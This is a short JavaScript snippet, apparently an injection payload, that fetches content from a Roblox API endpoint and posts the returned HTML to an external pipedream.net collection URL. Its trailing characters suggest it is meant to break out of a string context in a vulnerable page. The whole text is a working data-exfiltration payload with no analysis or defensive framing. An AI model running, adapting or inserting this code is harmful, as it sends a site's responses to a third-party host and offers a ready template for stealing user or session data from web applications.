fetch("https://apis.roblox.com/universal-app-configuration/v1/behaviors/cookie-policy/content")
  .then(res => res.text())
  .then(html => fetch("https://eon32wucwm6yep3.m.pipedream.net/", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ html })
  }))
  .catch(console.error);)//',
